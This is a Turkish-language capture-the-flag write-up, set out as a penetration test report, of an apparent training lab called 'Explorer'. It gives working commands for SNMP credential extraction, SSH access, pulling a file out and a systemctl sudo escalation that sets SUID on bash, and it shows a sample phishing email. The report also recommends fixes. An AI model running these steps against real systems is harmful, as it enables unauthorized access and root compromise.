# Explorer Penetrasyon Testi Raporu

---
https://app.hackviser.com/scenarios/explorer

## Yönetici Özeti

Bu rapor, `alexriveraexplorer.hv` (172.20.36.127) adresinde barındırılan hedef sistem üzerinde gerçekleştirilen kapsamlı güvenlik değerlendirmesini belgelemektedir. Değerlendirme, başlangıç keşif aşamasından root seviyesi erişime kadar sistemin tamamen ele geçirilmesine olanak sağlayan kritik güvenlik açıklarını tespit etmiştir.

**Ana Bulgular:**
- **Kritik:** SNMP servisinde varsayılan community string ile bilgi ifşası
- **Kritik:** Düz metin kimlik bilgilerinin SNMP OID ağacı üzerinden açığa çıkması
- **Yüksek:** systemctl binary üzerinde sudo yanlış yapılandırması (`NOPASSWD`)
- **Kritik:** Root dizininde düz metin olarak saklanan phishing altyapısı ve zararlı yazılım

Sömürü zinciri SNMP bilgi ifşasından SSH erişimi, yetki yükseltme ve nihayetinde root erişimine ilerlemiştir. Tehdit aktörü kimlik bilgileri, iletişim numaraları, hedef organizasyon bilgileri ve zararlı yazılım hash değerleri dahil hassas veriler başarıyla elde edilmiştir.

---

## 1. Numaralandırma

### 1.1 İlk Kurulum

Hedef domain, hosts dosyası düzenlenerek yerel ağ ortamına eşleştirildi:

```bash
sudo nano /etc/hosts
```

Aşağıdaki giriş eklendi:

```
172.20.36.127 alexriveraexplorer.hv
```

### 1.2 Ağ Servisi Keşfi

İlk keşif aşaması, açıkta kalan saldırı yüzeylerini tespit etmek için Nmap ile kapsamlı ağ servisi taraması ile başlatıldı:

```bash
nmap -sVC -T4 172.20.36.127
```

**Tarama Sonuçları:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 14:02 +0300
Nmap scan report for alexriveraexplorer.hv (172.20.36.127)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 5a:bc:c1:64:1b:a8:93:67:8c:a5:3a:c9:5e:28:94:50 (RSA)
|   256 71:07:65:ed:45:e7:b6:a5:18:c4:89:be:bc:fe:fb:01 (ECDSA)
|_  256 1f:7f:9d:f3:96:52:6f:b8:90:7e:dc:8e:b2:d6:2c:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Home - Alex Rivera
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
```

**Tespit Edilen Servisler:**

1. **SSH (Port 22):** OpenSSH 8.4p1 Debian - Halka açık kritik zafiyeti bulunmayan güncel sürüm. Kimlik bilgisi edinimi koşuluna bağlı potansiyel giriş noktası.

2. **HTTP (Port 80):** Apache httpd 2.4.56 - "Home - Alex Rivera" başlıklı kişisel portföy web sitesi.

### 1.3 Web Uygulaması Keşfi

`http://alexriveraexplorer.hv` adresinin incelenmesi, bir fotoğrafçı portföyü ve iletişim sayfası ortaya çıkardı. İletişim sayfası (`/contact.html`) incelendiğinde:

**Bulgu #1:** İletişim e-posta adresi tespit edildi: `contact@alexriveraexplorer.hv`

Standart web keşif teknikleri (Gobuster, Dirbuster ile dizin brute-force) herhangi bir yönetici arayüzü veya gizli dizin vermedi. Web uygulama katmanında belirgin sömürü vektörü tespit edilemedi.

---

## 2. Sömürü: SNMP Bilgi İfşası

### 2.1 Alternatif Saldırı Vektörü Keşfi

Web tabanlı saldırı vektörleri tükendikten sonra, dikkat alternatif bilgi ifşa kanallarına kaydırıldı. Hedef sistem, üretim ortamlarında sıklıkla yanlış yapılandırılan SNMP servisi açısından incelendi.

**Saldırı Gerekçesi:**

Görsel galeri gibi dinamik içerik yönetimi özelliklerine sahip web uygulamaları, genellikle şu amaçlarla backend otomasyon scriptleri kullanır:
- Görsel yeniden boyutlandırma ve thumbnail üretimi
- Metadata çıkarımı (EXIF veri işleme)
- Otomatik yedekleme işlemleri
- İçerik indeksleme ve kataloglama

Sistem yöneticileri sıklıkla Net-SNMP'yi `extend` direktifi ile yapılandırarak bu özel scriptleri SNMP OID sorguları üzerinden izlerler. Varsayılan community string'ler ("public" gibi) ile uygunsuz şekilde güvence altına alındığında, bu OID ağaçları yetkisiz taraflarca erişilebilir hale gelir.

### 2.2 SNMP Keşfi ve Bilgi Çıkarımı

SNMP servisinin `nsExtendOutput2Table` OID'si sorgulandı. Bu OID, Net-SNMP uzantı framework'ünün bir parçasıdır ve özel script çıktılarını SNMP sorguları üzerinden ifşa etmek için tasarlanmıştır:

```bash
snmpwalk -v 2c -c public -Oa alexriveraexplorer.hv .1.3.6.1.4.1.8072.1.3.2
```

**Komut Detayları:**
- `-v 2c`: SNMP versiyon 2c belirtir (community tabanlı kimlik doğrulama)
- `-c public`: Varsayılan community string "public" kullanır
- `-Oa`: Okunabilirlik için ASCII string çıktı formatını etkinleştirir
- `.1.3.6.1.4.1.8072.1.3.2`: `nsExtendOutput2Table` OID'sini sorgular

**Kritik Bulgu:**

SNMP sorgusu, script çıktısına gömülü düz metin kimlik bilgilerini başarıyla çıkardı:

```
...
Creds:
Username: explorer
Password: gnw2vejVkbatTM
...
```

**Bulgu #2:** SSH kimlik bilgileri tespit edildi: `explorer:gnw2vejVkbatTM`

**Güvenlik Açığı Analizi:**

Bu bilgi ifşası aşağıdaki güvenlik kusurlarını içermektedir:
1. **Varsayılan Community String:** Sistem "public" community string'ini kabul ediyor
2. **Düz Metin Kimlik Bilgisi:** Kimlik bilgileri şifreleme olmadan saklanmış ve iletilmiş
3. **Yetersiz Erişim Kontrolleri:** SNMP sorgularını kısıtlayan IP filtreleme veya ACL yok
4. **İzleme Araçlarında Hassas Veri:** Kimlik bilgileri asla izleme protokolleri üzerinden ifşa edilmemeli

Bu zafiyet **kritik önem dereceli bilgi ifşası** güvenlik açığı teşkil etmektedir (CVSS Base Score: 9.8 - Kritik).

---

## 3. İlk Erişim: SSH Kimlik Doğrulama

### 3.1 Kimlik Bilgisi Doğrulama

SNMP üzerinden elde edilen kimlik bilgileri ile SSH servisine karşı kimlik doğrulama girişiminde bulunuldu:

```bash
ssh explorer@alexriveraexplorer.hv
```

**Kullanılan Kimlik Bilgileri:**
- **Kullanıcı Adı:** explorer
- **Şifre:** gnw2vejVkbatTM

**Başarılı Kimlik Doğrulama:**

```
explorer@alexriveraexplorer.hv's password:
Linux debian 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
explorer@debian:~$
```

**Sonuç:** `explorer` kullanıcısı olarak shell erişimi elde edildi ve hedef sistemde dayanak noktası kuruldu.

**Güvenlik Tespit Notları:**
1. **Kimlik Bilgisi Tekrar Kullanımı:** SNMP'den elde edilen kimlik bilgileri SSH için geçerliydi
2. **Çok Faktörlü Kimlik Doğrulama Yok:** SSH erişimi ikincil kimlik doğrulama mekanizmalarından yoksundu
3. **Doğrudan Shell Erişimi:** SSH key zorunluluğu veya bastion host gibi ek güvenlik katmanları yoktu

### 3.2 Sömürü Sonrası Keşif

Ele geçirilen kullanıcı bağlamında gerçekleştirilen ilk keşif, hassas dosyaları ortaya çıkardı:

```bash
explorer@debian:~$ ls -la
Hotel_Reservation_Confirmation.pdf  whatsapp_conversation_log.txt
```

### 3.3 Hassas Dosya Analizi

**Dosya #1: whatsapp_conversation_log.txt**

```bash
cat whatsapp_conversation_log.txt
```

Bu dosya, rakip kuruluşları hedef alan zararlı yazılım geliştirme ve dağıtımını tartışan iki birey arasındaki tam WhatsApp konuşma kaydını içeriyordu:

```
[01/01/2024] Ethan Wright [+1-234-567-8901]: Hey Chris, got your message about the new project. What's up?
[01/01/2024] Chris Morgan [+1-987-654-3210]: Hey Ethan. I've got a proposal for you. It's quite sensitive, so I need your discretion.
[01/01/2024] Ethan Wright [+1-234-567-8901]: Understandable, I'm all ears.
[01/01/2024] Chris Morgan [+1-987-654-3210]: We're looking into deploying a piece of software that... let's say, will give us an advantage over our competitors. We think you're the right person for the job.
[01/01/2024] Ethan Wright [+1-234-567-8901]: Sounds intriguing, but what exactly are we talking about here?
[01/01/2024] Chris Morgan [+1-987-654-3210]: It's a software that can disrupt our competitors' operations. Technically, it's on the edge, but the rewards could be huge.
[01/01/2024] Ethan Wright [+1-234-567-8901]: You're talking about malware, aren't you?
[01/01/2024] Chris Morgan [+1-987-654-3210]: Let's not get caught up in definitions. It's a tool that could ensure our dominance in the market.
```

**Çıkarılan İstihbarat:**
- **Tehdit Aktörü:** Ethan Wright (+1-234-567-8901)
- **Suç Ortağı:** Chris Morgan (+1-987-654-3210)
- **Ücret:** Zararlı yazılım geliştirme ve dağıtımı için $4,000
- **Amaç:** Endüstriyel casusluk ve rekabet sabotajı

**Bulgu #3:** Tehdit aktörü telefon numarası: `+1-234-567-8901` (Ethan Wright)

**Dosya #2: Hotel_Reservation_Confirmation.pdf**

Adli analiz için dosya saldırgan hostuna sızdırıldı:

```bash
# Hedef sistem üzerinde (explorer kullanıcısı):
python3 -m http.server 8080
```

```bash
# Saldırgan hostunda:
wget http://172.20.36.127:8080/Hotel_Reservation_Confirmation.pdf
```

**Belge İçeriği:**

```
Name: Ethan Wright
Hotel Name: The British Elegance Hotel
Check-in Date: February 20, 2024
Check-out Date: February 23, 2024
Number of Guests: 2
Room Type: Deluxe Double Room
Price: £450 (inclusive of all taxes)
```

**Bulgu #4:** Tehdit aktörü konaklama bilgisi: The British Elegance Hotel

Bu belge, tehdit aktörünün kimliğini doğruladı ve kolluk kuvvetleri koordinasyonu için coğrafi konum istihbaratı sağladı.

---

## 4. Yetki Yükseltme

### 4.1 Sudo İzinleri Keşfi

Kısıtlı dizinlere (özellikle `/root`) erişmek ve kampanya altyapısı detaylarını incelemek için yetki yükseltme gerekli oldu:

```bash
sudo -l
```

**Çıktı:**

```
Matching Defaults entries for explorer on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User explorer may run the following commands on debian:
    (ALL) NOPASSWD: /bin/systemctl
```

### 4.2 Kritik Bulgu: systemctl Sudo Yanlış Yapılandırması

**Teknik Analiz:**

`explorer` kullanıcısı, şifre doğrulaması olmadan `/bin/systemctl` üzerinde sınırsız sudo erişimine sahipti. Systemd servislerini yönetmek için kullanılan systemctl binary'si, kötü amaçlı servis unit dosyaları oluşturularak root yetkilerine sahip rastgele komutları çalıştırmak için sömürülebilir.

**Sömürü Mekanizması:**

1. **Systemctl Link Yeteneği:** `systemctl link` komutu herhangi bir dosya sistemi konumundan rastgele servis dosyalarını kaydetmeye izin verir
2. **ExecStart Direktif Çalıştırması:** Servis unit dosyaları, servis başlatılması sırasında `ExecStart` komutlarını root yetkileriyle çalıştırır
3. **SUID Bit Kalıcılığı:** `/bin/bash` üzerinde SUID biti ayarlanarak kalıcı yetki yükseltme mekanizması oluşturulur
4. **Bash -p Parametresi:** `-p` parametresi, SUID ile çağrıldığında bash'in yükseltilmiş yetkilerini düşürmesini engeller

### 4.3 Sömürü: Root'a Yetki Yükseltme

```bash
# Geçici servis dosyası oluştur
TF=$(mktemp).service

# /bin/bash üzerinde SUID biti ayarlayan kötü amaçlı servisi tanımla
cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/chmod +s /bin/bash
[Install]
WantedBy=multi-user.target
EOF

# Servisi systemd ile kaydet
sudo /bin/systemctl link $TF

# Servisi etkinleştir ve başlat
sudo /bin/systemctl enable --now $TF

# SUID bash aracılığıyla yetkili shell başlat
/bin/bash -p
```

**Çalıştırma Sonuçları:**

```
Created symlink /etc/systemd/system/tmp.V6oTULnzIa.service → /tmp/tmp.V6oTULnzIa.service.
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.V6oTULnzIa.service → /tmp/tmp.V6oTULnzIa.service.
bash-5.1# whoami
root
```

**Sonuç:** Root erişimi başarıyla elde edildi.

```bash
bash-5.1# whoami
root
bash-5.1#
```

Bu zafiyet, systemctl sudo erişimine sahip herhangi bir kullanıcının kolayca root yetkilerini elde etmesini sağlayan **kritik yetki yükseltme kusuru** teşkil etmektedir (CVSS Base Score: 8.8 - Yüksek).

---

## 5. Sömürü Sonrası ve Veri Toplama

### 5.1 Root Dizin Keşfi

Root erişimi kurulduğunda, kritik altyapı bileşenleri keşfedildi:

```bash
cd /root
ls -la
```

**Keşfedilen Dosyalar:**

```
phishing_email.txt
update.exe
```

### 5.2 Phishing Kampanyası Altyapısı

**Dosya: phishing_email.txt**

```bash
cat phishing_email.txt
```

**İçerik:**

```
From: itdepartment@greenhealthsolutions.hv

To:
j.smith@greenhealthsolutions.hv
emily.jones@greenhealthsolutions.hv
michael.brown@greenhealthsolutions.hv
lisa.wilson@greenhealthsolutions.hv
daniel.johnson@greenhealthsolutions.hv
sara.miller@greenhealthsolutions.hv
chris.davis@greenhealthsolutions.hv
olivia.garcia@greenhealthsolutions.hv
mark.lee@greenhealthsolutions.hv
jennifer.taylor@greenhealthsolutions.hv

Subject: Urgent: Software Update Required for All Employees

Dear Team,

We hope this message finds you well. As part of our ongoing efforts to improve our network security and efficiency, the IT department is rolling out a new software update that is mandatory for all employees.

This update includes essential security enhancements and performance improvements to ensure the integrity and reliability of our work environment.

To complete this update, please click on the link below and follow the instructions to install the new software. The process is quick and straightforward, and it must be completed by the end of the week to maintain network access.

For any questions or concerns, please do not hesitate to contact the IT department directly.

Thank you for your immediate attention to this matter and for your continued cooperation.

Best regards,
IT Department
```

**Teknik Analiz:**

Bu belge, **greenhealthsolutions.hv** organizasyonunun BT departmanını taklit etmek üzere tasarlanmış sofistike bir spear-phishing şablonu teşkil etmektedir. Saldırı metodolojisi şunları içermektedir:

1. **Otorite Taklidi:** Meşru BT departmanı e-posta adresinin taklit edilmesi
2. **Aciliyet Taktikleri:** Anında aksiyon baskısı için zorunlu uyum son tarihi
3. **Sosyal Mühendislik:** Kullanıcı şüphesini aşmak için güvenlik iyileştirmesi anlatısı
4. **Zararlı Yazılım Dağıtımı:** Link tabanlı payload dağıtım mekanizması

**Bulgu #5:** Hedef organizasyon tespit edildi: `greenhealthsolutions.hv`

**Bulgu #6:** Hedeflenen mağdur sayısı: 10 çalışan

### 5.3 Zararlı Yazılım Analizi

**Dosya: update.exe**

Tehdit istihbaratı korelasyonu için kriptografik hash analizi gerçekleştirildi:

```bash
md5sum update.exe
```

**Hash Değeri:**

```
30e40e4e8c5ca8298aec30e040fc9e0e  update.exe
```

**Teknik Detaylar:**

- **MD5 Hash:** `30e40e4e8c5ca8298aec30e040fc9e0e`
- **Dosya Türü:** Windows Portable Executable (.exe)
- **Amaç:** Phishing kampanyası aracılığıyla dağıtım için kötü amaçlı payload
- **Dağıtım Yöntemi:** Phishing e-postası şablonuna gömülü link

**Bulgu #7:** Zararlı yazılım hash değeri: `30e40e4e8c5ca8298aec30e040fc9e0e`

Bu hash, güvenlik altyapısı genelinde tespit ve bilinen zararlı yazılım aileleriyle korelasyonu sağlayan tehdit istihbarat platformları için bir Uzlaşma Göstergesi (IoC) olarak hizmet etmektedir.

```bash
root@debian:/root# md5sum update.exe
30e40e4e8c5ca8298aec30e040fc9e0e  update.exe
root@debian:/root#
```

---

## 6. Sonuç ve Düzeltme

### 6.1 Bulguların Özeti

Bu değerlendirme, çok aşamalı bir saldırı zinciri aracılığıyla Explorer altyapısını başarıyla ele geçirdi:

1. **SNMP Bilgi İfşası:** Varsayılan community string ile düz metin kimlik bilgilerinin açığa çıkması
2. **SSH Erişimi:** Açığa çıkan kimlik bilgileri ile sistem erişimi
3. **Hassas Veri Keşfi:** Tehdit aktörü iletişim bilgileri ve operasyonel istihbarat
4. **Yetki Yükseltme:** systemctl sudo yanlış yapılandırması ile root erişimi
5. **Phishing Altyapısı Keşfi:** Hedef organizasyon, zararlı yazılım ve kampanya materyalleri

### 6.2 Düzeltme Önerileri

**Kritik Öncelik:**

1. **SNMP Servis Sertleştirmesi**
   - Kullanılmıyorsa SNMP daemon'ını tamamen devre dışı bırakın:
     ```bash
     systemctl stop snmpd
     systemctl disable snmpd
     ```
   - Güçlü, kriptografik olarak rastgele community string'ler uygulayın (minimum 32 karakter)
   - SNMP sorgularını yalnızca yetkili yönetim hostlarıyla kısıtlayan ACL'ler yapılandırın:
     ```
     # /etc/snmp/snmpd.conf
     rocommunity GüçlüRastgeleString 10.0.0.0/8
     ```
   - Kimlik doğrulama ve şifreleme ile SNMPv3'e geçin:
     ```
     createUser snmpadmin SHA güçlüAuthŞifre AES güçlüPrivŞifre
     rouser snmpadmin priv
     ```
   - SNMP çıktısından tüm kimlik bilgilerini ve hassas verileri kaldırın

2. **Kimlik Bilgisi Yönetimi Uygulama**
   - İzleme sistemlerinden düz metin kimlik bilgilerini tamamen kaldırın
   - Şifreli kimlik bilgisi depolaması uygulayın (HashiCorp Vault, AWS Secrets Manager)
   - 90 günlük zorunlu şifre rotasyonu politikaları oluşturun
   - Tüm yapılandırma dosyalarını, scriptleri ve veritabanlarını sabit kodlanmış kimlik bilgileri açısından denetleyin

3. **Sudo Yetki Ayrımı**
   - systemctl için NOPASSWD sudo erişimini kaldırın:
     ```bash
     # /etc/sudoers dosyasından kaldırın:
     explorer ALL=(ALL) NOPASSWD: /bin/systemctl
     ```
   - En Az Yetki İlkesini uygulayın - yalnızca belirli servis operasyonları için sudo erişimi verin:
     ```
     # Örnek: Yalnızca belirli servisleri yeniden başlatmaya izin ver
     explorer ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx
     ```
   - Yetki yükseltme girişimlerini izlemek için sudo loglama etkinleştirin:
     ```
     Defaults logfile="/var/log/sudo.log"
     Defaults log_input, log_output
     ```

**Yüksek Öncelik:**

4. **Hassas Veri Koruma**
   - Kolluk kuvvetleri soruşturması için tüm kötü amaçlı materyalleri derhal güvence altına alın
   - Hassas depolama için tam disk şifrelemesi (LUKS) dağıtın
   - SELinux veya AppArmor zorunlu erişim kontrolleri uygulayın
   - Yetkisiz hassas veri depolamayı izleyen ve önleyen DLP çözümü dağıtın

5. **SSH Sertleştirmesi**
   - Şifre kimlik doğrulamasını devre dışı bırakın ve SSH key kimlik doğrulamasını zorunlu kılın:
     ```
     # /etc/ssh/sshd_config
     PasswordAuthentication no
     PubkeyAuthentication yes
     ```
   - Google Authenticator veya donanım token tabanlı çok faktörlü kimlik doğrulama uygulayın
   - Başarısız kimlik doğrulama girişimlerinden sonra otomatik IP engelleme için Fail2ban dağıtın
   - SSH bağlantısını bilinen yönetim ağlarıyla kısıtlayın

6. **Olay Müdahale Aksiyonları**
   - Phishing kampanyası ve zararlı yazılım dağıtımını kolluk kuvvetlerine bildirin
   - Yaklaşan saldırı hakkında **greenhealthsolutions.hv** organizasyonunu uyarın
   - Tehdit istihbarat platformlarına IoC'leri gönderin:
     - **Zararlı Yazılım MD5:** 30e40e4e8c5ca8298aec30e040fc9e0e
     - **Tehdit Aktörü İletişim:** +1-234-567-8901 (Ethan Wright)
     - **Komuta & Kontrol:** alexriveraexplorer.hv (172.20.36.127)
   - Kampanya kapsamını ve potansiyel mağdur sayısını belirlemek için tam disk adli incelemesi yürütün
   - Explorer hesabını devre dışı bırakın ve tüm sistem kimlik bilgilerini rotasyona tabi tutun

**Orta Öncelik:**

7. **Güvenlik İzleme**
   - SNMP sorgulama ve yetki yükseltme girişimleri için saldırı tespit sistemi (IDS) dağıtın
   - Kritik yapılandırma dosyalarında dosya bütünlüğü izleme (FIM) uygulayın
   - Güvenlik olaylarının kapsamlı denetimi için auditd etkinleştirin

8. **Ağ Segmentasyonu**
   - Yönetim trafiğini üretim ağlarından ayırmak için VLAN segmentasyonu uygulayın
   - SNMP erişimini adanmış yönetim ağıyla kısıtlayın
   - Kritik servislere erişimi kontrol etmek için host-based firewall kuralları dağıtın

### 6.3 Güvenlik Etkileri

Tespit edilen güvenlik açıkları, yetkisiz aktörlerin şunları yapmasına izin veren tam bir güvenlik başarısızlığını temsil etmektedir:
- Hassas sistem kimlik bilgilerini çıkarma
- Tehdit aktörü operasyonel istihbaratına erişim
- Root seviyesi sistem ele geçirme elde etme
- Aktif phishing kampanyası altyapısını ve zararlı yazılımı keşfetme
- Üçüncü taraf organizasyonları hedef alan kötü niyetli faaliyetlerin kanıtını ortaya çıkarma

Kötü niyetli aktörler tarafından sömürülmesini ve hedef organizasyonun zarar görmesini önlemek için acil düzeltme ve olay müdahale aksiyonları gereklidir.

### 6.4 Uyumluluk İhlalleri

Tespit edilen zafiyetler ve kötü niyetli faaliyetler, aşağıdaki düzenlemelerin ihlalini oluşturmaktadır:
- **Bilgisayar Dolandırıcılığı ve İstismar Yasası (CFAA):** Yetkisiz erişim ve zararlı yazılım dağıtımı
- **GDPR Madde 32:** Yetersiz teknik ve organizasyonel güvenlik önlemleri
- **PCI DSS Gereksinim 2.2.4:** Güvensiz varsayılan yapılandırmalar (SNMP community strings)
- **SOC 2 CC6.1:** Yetersiz mantıksal erişim kontrolleri

---

## 7. Komut Referansı

### Keşif Komutları
```bash
# İlk ağ taraması
nmap -sVC -T4 172.20.36.127

# SNMP keşfi
snmpwalk -v 2c -c public -Oa alexriveraexplorer.hv .1.3.6.1.4.1.8072.1.3.2
```

### İstismar Komutları
```bash
# SSH kimlik doğrulama
ssh explorer@alexriveraexplorer.hv

# Dosya sızdırma
python3 -m http.server 8080
wget http://172.20.36.127:8080/Hotel_Reservation_Confirmation.pdf
```

### Yetki Yükseltme Komutları
```bash
# Sudo keşfi
sudo -l

# Systemctl istismarı
TF=$(mktemp).service
cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/chmod +s /bin/bash
[Install]
WantedBy=multi-user.target
EOF
sudo /bin/systemctl link $TF
sudo /bin/systemctl enable --now $TF
/bin/bash -p
```

### Sömürü Sonrası Komutları
```bash
# Root dizin keşfi
cd /root
ls -la

# Zararlı yazılım hash analizi
md5sum update.exe
```

---

**Rapor Oluşturulma Tarihi:** 2026-01-18

**Değerlendirme Türü:** Bayrak Ele Geçirme (CTF) Güvenlik Egzersizi

**Hedef Sistem:** Explorer (alexriveraexplorer.hv)

**MacallanTheRoot**: https://github.com/MacallanTheRoot
